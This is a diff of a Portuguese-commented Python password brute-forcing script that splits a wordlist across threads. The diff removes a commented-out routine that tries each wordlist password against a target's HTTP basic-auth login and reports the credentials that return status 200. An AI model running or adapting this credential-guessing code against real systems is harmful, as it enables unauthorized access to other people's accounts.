@@ -49,28 +49,24 @@ def divisores(num):
            yield i
     yield num
 
-def isPar(nmr):
-	if int(num) % 2 == 0:
-		return True
-	else:
-		return False
-
 def bruteforce(passwordlist):
-	#LerArquiov
+	#Le o arquivo de senha
 	fd = open(passwordlist, 'r')
-	#Salvar num array
+	
+	#Salva numa lista
 	passwords = fd.readlines()
-	#get size do array
+
+	#Pega a quantidade de elementos que tem na lista de senhas
 	qtdElementosNaLista = len(passwords)
 
 	print ()
 	print ("==========================[Começando]==========================")
 	print ()
 	
-	#acho os divisores
+	#Acha os divisores
 	divisor = list(divisores(qtdElementosNaLista))
 	
-	#acho o maior divisor
+	#Acha o maior divisor, que nao seja ele mesmo
 	md = 0
 
 	if divisor[-1] == len(passwords):
@@ -92,13 +88,17 @@ def bruteforce(passwordlist):
 	print ("==========================[Dividindo e conquistando]==========================")
 	print ()
 
-	#separo a lista em n listas, onde n = maior divisor
+	#Separa a lista em n listas, onde n = maior divisor
 	print (md)
 	splited = [passwords[i::md] for i in range(md)]
 
 	nmrThreads = 4
 
-	#Preciso que dividir em uma quantidade exata de array pra cada Thread
+	#Preciso agora dividir em uma quantidade exata de arrays pra cada Thread	
+
+
+
+
 
 	#print (splited)
 	'''
@@ -106,37 +106,3 @@ def bruteforce(passwordlist):
 	'''
 
 bruteforce('pwd-list.txt')
-'''
-int(len(passwords))
-def bruteforce(target,passwordlist,username):
-    fd = open(passwordlist, 'r')
-    passwords = fd.readlines()
-    i = 0
-    print ("")
-    print ("==========================[Começando]==========================")
-    print ("")
-    for password in passwords:
-        i = i + 1
-        password = password.rstrip()
-        test = requests.get('http://'+target, auth=(username, password))
-        code = test.status_code
-        print  (colored('[%s]         USER[%s]          PASS [%s]', 'yellow') % (i,username,password))
-        if code == 200:
-            print ("")
-            print (colored("==========================[LOGIN FOUNDED]==========================", 'yellow', attrs=['bold']))
-            print ("")
-            print (colored("===================================================================", 'yellow', attrs=['bold']))
-            print (colored("                 [  :: USER[%s] AND PASS[%s]  ]                    ", 'green', attrs=['bold']) % (username, password))
-            print (colored("===================================================================", 'yellow', attrs=['bold']))
-            print ()
-            print ()
-            print ()
-            print ()
-            print ()
-            print ()
-            print ()
-            print ("Codigo : ",code)
-            sys.exit()
-        else:
-            pass
-'''
